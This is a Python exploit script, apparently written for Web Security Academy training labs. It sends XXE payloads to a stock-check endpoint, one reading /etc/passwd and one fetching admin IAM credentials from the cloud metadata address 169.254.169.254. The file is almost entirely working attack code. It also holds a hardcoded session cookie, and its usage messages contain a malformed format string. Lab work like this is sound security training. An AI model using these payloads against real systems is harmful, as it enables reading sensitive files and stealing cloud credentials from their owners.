#!/bin/env python3
import requests
import sys
import urllib3
from urllib.parse import urlparse
from colorama import init

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
	'Content-Type': 'application/xml',
	'Cookie': 'session=LtRxi1qGtfQXDFBJNKUM2AP7EmUF6EsO'
	}

def exploit(url,lab_num):
	stock_path = '/product/stock'
	payloads = ''
	if lab_num == '1':
		payloads = 'file:///etc/passwd'
	elif lab_num == '2':
		payloads = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'
	else:
		print("\033[1;31;40m[-] The lab number is invalid, please enter 1 or 2.")
		sys.exit(-1)
	params = """<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE sec[<!ENTITY dog SYSTEM "{payload}">]>
	  <stockCheck>
	    <productId>&dog;</productId>
	    <storeId>1</storeId>
	  </stockCheck>""".format(payload=payloads)

	req = requests.post(url + stock_path, data=params, headers=header, verify=False, allow_redirects=False, proxies=proxies)

	if(req.status_code == 504):
		print("\033[36m[-] Response: [Server Error: Gateway Timeout]")
		print("\033[1;31;40m[-] The lab url is invalid, please get it again.")
		sys.exit(-1)
	elif(req.status_code == 400):
		print("\033[1;32;40m[+] Exploiting XXE successful!")
		print("\033[1;33;40m[+] Output of:\n")
		print(req.text)
	else:
		print("\033[1;31;40m[-] Exploiting XXE failed.")

def main():
	if len(sys.argv) != 3:
		print("\033[36m[+] Usage: {0}} <url> <lab number(1 or 2)>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0}} https://xxx.web-security-academy.net 1".format(sys.argv[0]))
		sys.exit(-1)

	o = urlparse(sys.argv[1])
	lab_num = str(sys.argv[2])
	url = o.scheme + "://" + o.hostname
	
	print("\033[36m[+] Exploiting XXE using external entities to retrieve files...")
	
	exploit(url, lab_num)


if __name__ == "__main__":
	main()
